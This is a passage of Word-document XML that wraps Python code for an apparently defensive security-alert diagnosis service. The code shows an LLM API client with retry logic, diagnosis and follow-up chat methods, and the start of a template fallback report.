        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "max_tokens": self.max_tokens,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBC7789">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "stream": False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDB33B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385F7A07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if json_mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709ED5B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            payload["response_format"] = {"type": "json_object"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BADC6A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC4B9C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        last = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A946EC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for attempt in range(self.max_retries + 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2733A401">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD7662E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                with httpx.Client(timeout=timeout_s) as client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1108BA6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    resp = client.post(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEC1843">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                        f"{self.base_url}/chat/completions",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0153750B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                        json=payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16574B52">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                        headers={"Authorization": f"Bearer {key}"},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100C633D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6161D77B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                if resp.status_code == 200:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A206D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    self.calls += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0C4956">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    return resp.json()["choices"][0]["message"]["content"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEF9D56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                last = f"HTTP {resp.status_code}: {resp.text[:200]}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC11474">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                # 4xx 除了 429 都是请求本身的问题，重试没有意义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76838276">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                if 400 &lt;= resp.status_code &lt; 500 and resp.status_code != 429:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C677CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ED532F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            except (httpx.HTTPError, ValueError) as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A43AE00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                # ValueError 来自代理环境变量（如 ALL_PROXY 写成 socks://），构造 Client 时就抛，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735106F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                # 重试也不会好，直接收工交给调用方降级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA5CFDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                last = f"{type(exc).__name__}: {exc}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550AC8A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                if isinstance(exc, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EA469E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9722BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            time.sleep(min(2 ** attempt * 0.5, 4.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E12834B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.failures += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFBC605">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise LLMUnavailable(last or "未知错误")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB1F138">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77BFA350">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ------------------------------------------------------------------ 诊断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3929FDE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BCB393D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def diagnose(self, alert: dict, evidence, chunks) -&gt; tuple[Diagnosis, int]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40535673">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """返回 (报告, 耗时毫秒)。LLM 不可用时抛 LLMUnavailable，由调用方降级。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C60FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        t0 = time.perf_counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B0FE31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        text = self._chat(SYSTEM, build_diagnosis(alert, evidence, chunks), self.timeout, json_mode=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1B899F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        elapsed = int((time.perf_counter() - t0) * 1000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39888411">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return parse_diagnosis(text, alert.get("category", ""), alert.get("confidence", 0.0)), elapsed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C384A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="298424F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def chat(self, report_markdown: str, history, question: str) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74790E3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self._chat(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592125A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "你是一名网络安全分析工程师，正在回答关于自己刚写过的报告的追问。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDDB042">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "不编造报告中不存在的数据；超出范围就说明报告里没有这个信息。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48340F53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            build_chat(report_markdown, history, question),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2772EDEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            timeout_s=min(self.timeout, 20),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C368880">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A27554A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40B4D335">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E2BE0A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fallback_diagnosis(alert: dict, evidence) -&gt; Diagnosis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D4236B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """模板报告：LLM 不可用时也要让告警完整落库、看板不留空。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3447B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    category = alert.get("category", "未知类别")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7779F2C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    risk = alert.get("risk", "medium")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1CAC92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    by_rule = alert.get("source") == "rule"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C172FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ev = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19120BAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for item in evidence or []:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4936D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
